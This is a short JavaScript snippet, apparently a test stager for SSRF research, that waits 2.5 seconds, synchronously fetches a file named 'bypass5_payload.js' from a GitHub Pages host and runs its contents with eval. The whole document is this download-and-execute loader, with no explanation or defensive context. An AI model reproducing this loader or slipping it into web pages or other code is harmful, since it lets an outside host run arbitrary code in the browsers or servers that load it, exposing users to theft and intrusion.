setTimeout(function(){
  var x=new XMLHttpRequest();
  x.open('GET','https://chenzhixin13149201-cell.github.io/ssrf-test-assets/bypass5_payload.js',false);
  x.send();
  eval(x.responseText);
},2500);
